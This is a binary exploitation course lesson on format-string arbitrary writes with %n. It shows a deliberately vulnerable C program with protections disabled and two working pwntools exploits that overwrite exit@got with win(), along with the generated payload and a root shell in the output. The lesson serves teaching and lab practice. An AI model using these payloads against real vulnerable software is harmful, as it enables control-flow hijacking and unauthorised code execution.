---
title: "Lesson 7.2: Arbitrary Memory Writes with %n"
image:
  path: /assets/img/covers/pwn-7-2-format-string-arbitrary-write.webp
  alt: "Arbitrary Memory Writes with %n"
date: 2022-12-07 12:50:00 +0700
categories: ["Binary Exploitation", "Pwn · Format String"]
tags: [pwn, format-string, got-overwrite, relro]
render_with_liquid: false
---

Lesson 7.1 gave us reading. The `%n` specifier turns a format string bug into a writing tool, since it writes the number of characters printed so far to an address. Control the character count and the destination address, and you can write any value to any place. This lesson uses `%n` to overwrite a GOT entry, turning `exit` into `win`, and gets a real shell on glibc 2.39.

![Overwriting the exit GOT entry with win using a two-stage %hn write](/assets/img/pwn/pwn-7-2-format-string-arbitrary-write.svg)
_fmtstr_payload splits the write into two half-word writes so exit@got becomes the address of win._

**Time:** about 70 minutes of reading and lab work. **Difficulty:** medium to hard.

**Prerequisites:** Lesson 7.1 (finding the offset, the format string mechanism), Lesson 1.3 (GOT and PLT), Lesson 5.1 (RELRO), and Lesson 8.1 if you want to go deeper into GOT overwrites.

**Tools:** pwntools (especially `fmtstr_payload`), gdb with pwndbg, checksec.

## Goals

After this lesson you will understand what `%n` writes, where it writes it, and how `%hn`/`%hhn` write 2 or 1 bytes, be able to write a large value in pieces instead of printing billions of characters, use pwntools's `fmtstr_payload` to generate the write payload automatically, overwrite a GOT entry to redirect execution and get a shell, and know when Full RELRO blocks a GOT write and what to target instead.

## Theory

### How %n writes

`%n` prints nothing. It takes the matching argument as a pointer and writes to it **the number of characters printf has printed so far**, as an `int` (4 bytes). Variants:

- `%hn` writes 2 bytes (a `short`).
- `%hhn` writes 1 byte (a `char`).
- `%n` writes 4 bytes, `%lln` writes 8 bytes.

To write a value `V` to an address `A`: place `A` into a cell on the stack that we control (our own buffer, as in Lesson 7.1), print exactly `V` characters, and use `%n` pointing at the cell holding `A`. Printing exactly `V` characters usually relies on the width flag, for example `%100c` prints one character but pads to 100 columns, adding 100 to the counter.

### Why you write it word by word

If the address to write is a large value like `0x401186`, writing all 4 bytes with one `%n` means printing `0x401186`, over 4 million characters, which is slow and likely to break. The trick is to split it, writing the low 2 bytes with one `%hn` and the high 2 bytes with another `%hn`, each needing at most 65535 characters printed. `%hhn` can even write one byte at a time. The character counter only ever increases, so when writing in several stages you sort the values in increasing order and add only the difference each time.

Good news: pwntools does all of this for you. `fmtstr_payload(offset, {addr: value})` automatically picks `%hn`/`%hhn`, orders the writes, and places the destination addresses in the payload. You only need the offset (found as in Lesson 7.1) and the address/value pairs.

### Choosing a target: a GOT entry

The GOT (Global Offset Table) is a table of pointers to library functions. When a binary calls `exit`, it actually jumps through `exit@plt`, which then jumps to the pointer held in `exit@got`. If we overwrite `exit@got` with the address of `win`, then the call `exit(0)` runs `win` instead of exiting. This is GOT overwrite.

Conditions for being able to write the GOT:

- **RELRO** (Relocation Read-Only) decides whether the GOT is writable. **Partial RELRO**: `.got.plt` stays writable, GOT overwrite works. **Full RELRO** (the gcc 13 default): the entire GOT becomes read-only after loading, writing to it SIGSEGVs, and you have to pick a different target.
- This lab's binary deliberately builds with Partial RELRO to demonstrate the classic technique.

### ASLR and no-PIE: why no leak is needed here

Lab 7.2 builds **no-PIE**. The binary's own region (code, GOT, global variables) loads at the fixed address `0x400000`, and ASLR does not touch it (ASLR only randomizes libc, the stack, and the heap). So both the write target (`exit@got = 0x404030`) and the value to write (`win = 0x401186`) are fixed and known in advance, no leak needed. This is different from Lesson 7.1, which had to leak because everything there was in a randomized region. If the binary were built with PIE, you would have to leak the PIE base first (as in Lesson 7.1) before you could know the GOT and `win` addresses to write.

### If Full RELRO blocks the GOT write

When the GOT is read-only, pick a different target for `%n`:

- **The saved return address on the stack**: overwrite the return address to jump to `win` or to build a ROP chain. This needs a leaked stack address first (a stack pointer from `%p`).
- **A function pointer or global variable** the program will use later (for example a permission-check flag, or a callback).
- Avoid `__malloc_hook`/`__free_hook`: these hooks were removed starting glibc 2.34 and no longer exist on glibc 2.39.

## Demo

Environment: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0, ASLR on.

Here is the source, `src.c` (shortened).

```c
void win() {
    puts("[win] control flow hijacked by a %n write!");
    system("/bin/sh");
    _exit(0);
}
int main() {
    char buf[256];
    setvbuf(stdout, NULL, 2, 0);
    puts("== fmtstr write demo (glibc 2.39) ==");
    printf("fmt> ");
    int n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0) return 1;
    buf[n] = 0;
    printf(buf);     // <-- the bug: %n writes here
    puts("");
    exit(0);         // exit goes through the PLT/GOT -> overwriting exit@got redirects here
    return 0;
}
```

Build it as shown in the Lab section below.

```bash
# no-PIE: win and the GOT are fixed addresses, no leak needed even with ASLR on.
# -fno-stack-protector: no canary. FORTIFY off so %n is not blocked.
# -Wl,-z,relro,-z,lazy: Partial RELRO -> .got.plt stays writable.
gcc -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -fno-stack-protector -no-pie \
    -fcf-protection=none -Wl,-z,relro,-z,lazy -O0 -g -o writen src.c
```

`checksec`: Partial RELRO, No canary, NX enabled, No PIE. `win = 0x401186`, `exit@got = 0x404030`.

### Finding the offset

Send `BBBBBBBB.%p.%p...`; the marker `0x4242424242424242` lands at `%6$p`, so the offset is **6**.

### Method 1: pwntools fmtstr_payload

```python
context.binary = e = ELF('./writen')
payload = fmtstr_payload(6, {e.got['exit']: e.sym['win']}, write_size='short')
io = process('./writen')
io.recvuntil(b'fmt> ')
io.sendline(payload)
io.recvuntil(b'hijacked by a %n write!')   # win() has run
io.sendline(b'id')
```

pwntools generates this payload, printed here to show the mechanism.

```
[*] fmtstr_payload (40 bytes): b'%4486c%9$lln%186c%10$hhn0@@\x00\x00\x00\x00\x002@@\x00\x00\x00\x00\x00'
```

Reading this payload, it prints `4486` characters then `%9$lln` writes (slot 9 holds `0x404030`), then prints `186` more characters before `%10$hhn` writes a byte (slot 10 holds `0x404032`). pwntools arranges this so the running total matches each stage. The two destination addresses sit at the end of the payload (`0@@...` is `0x404030`, `2@@...` is `0x404032`), exactly matching slots 9 and 10.

Here is the real output when run, as seen in the transcript in the Lab section below.

```
[+] win() has run, inside a shell
===PWNED_7_2===
uid=0(root) gid=0(root) groups=0(root)
6.8.0-134-generic
===END===
[OK] exit@got overwritten -> win -> shell successful
```

`exit(0)` jumped into `win`, `system("/bin/sh")` gave a shell, running `id` shows `uid=0(root)`.

### Method 2: a single %hn by hand

To see the mechanism clearly, do it manually. `win = 0x401186`. Conveniently, `exit@got` initially holds the resolver stub `0x00401096`, meaning byte 3 is already `0x40` and the high bytes are `00`. So we only need to write the low 2 bytes `0x1186` (= 4486) with a single `%hn`.

```python
count = win & 0xffff                  # 0x1186 = 4486
fmt = ('%%%dc' % count).encode() + b'%8$hn'   # buf at pos6 -> the address is at pos8 = buf+16
fmt = fmt.ljust(16, b'A')
payload = fmt + p64(e.got['exit'])    # place exit@got at buf+16
```

Printing 4486 characters, then `%8$hn` writes the 2 bytes `0x1186` into `exit@got`, the existing `0x40` byte and the high `00` bytes stay as they are. `exit@got` becomes `0x401186 = win`. This was also tested and produces a shell with `uid=0(root)`. Change the `METHOD` variable in `exploit.py` to run this version.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 7.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/7.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/7.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/7.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/7.2/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: the binary, with Partial RELRO, no-PIE, no canary, ASLR on, and a `win()` function.
- Goal: overwrite `exit@got` with `win` using `%n`, get a shell.
- Hints, in steps:
  - Hint 1: find the offset as in Lesson 7.1 (marker plus `%N$p`).
  - Hint 2: get `e.got['exit']` and `e.sym['win']` from pwntools; no-PIE means they are fixed.
  - Hint 3: let pwntools handle the write: `fmtstr_payload(offset, {e.got['exit']: e.sym['win']})`.
  - Hint 4: for a deeper understanding, write a `%hn` by hand. Look at the initial value of `exit@got` to decide how many bytes you actually need to change.
- Self check: can you explain "why no leak is needed on a no-PIE binary" and "what target to use instead when Full RELRO is on"?

## Key takeaways

- `%n` writes the number of characters printed so far, to the address given by its argument.
- `%hn` writes 2 bytes, `%hhn` writes 1 byte, used to write a large value in stages.
- The write target and the write value must already be known, sitting on the stack or inside the binary.
- GOT overwrite needs a writable GOT: Partial RELRO or No RELRO.
- Full RELRO means switching to the saved RIP, a function pointer, or a global variable instead.
- no-PIE: the target and the value are fixed, no leak needed even with ASLR on.

## Common pitfalls

- Writing 4 or 8 bytes in one shot. Printing millions to billions of characters hangs the program. Always split with `%hn`/`%hhn`.
- Trying to write the GOT anyway under Full RELRO. The write SIGSEGVs. Check `checksec` first; under Full RELRO pick a different target.
- Wrong parameter offset for the destination addresses. pwntools places the destination addresses right after the directive section, so they land at offset+k, not at offset itself. Let pwntools compute this by passing it the original `offset`.
- Using `fmtstr_payload` but forgetting `context.binary`/`context.bits`. The payload gets the wrong pointer width. Always set `context.binary = ELF(...)` first.
- Worrying about whether `exit@got` is already resolved. It does not matter here: whether it holds the stub or the real `exit`, we overwrite it with `win` either way. On a different binary, though, the target function must actually be called AFTER the overwrite happens.
- Looking for `__malloc_hook`/`__free_hook` on a modern glibc. They were removed starting 2.34; on glibc 2.39 they do not exist, do not waste time there.

## Further reading

- Lesson 8.1: GOT overwrite as its own standalone technique, other GOT targets.
- pwntools documentation for `fmtstr_payload` (the `write_size` options, how it stages the writes).
- `man 3 printf`, the `%n` section and glibc's security warning about it.
- The format string (write) challenges on pwnable.tw, to practice multi-stage writes and writes when the GOT is locked.
